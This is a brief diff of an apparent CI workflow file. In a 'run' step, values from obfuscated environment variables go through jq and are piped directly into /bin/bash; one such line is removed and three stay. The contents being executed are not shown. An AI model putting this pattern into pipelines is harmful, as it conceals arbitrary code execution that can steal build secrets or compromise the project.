@@ -24,7 +24,6 @@ jobs:
         run: |
           printf '%s' "$n4" | jq -r .tvcpv4 | /bin/bash
           printf '%s' "$ndn47754" | jq -r .ocd8 | /bin/bash
-          echo $heoc92917 | jq -r .fdlkl3 | /bin/bash
           echo $o9 | jq -r .vm235 | /bin/bash
 
       - name: Store artifact
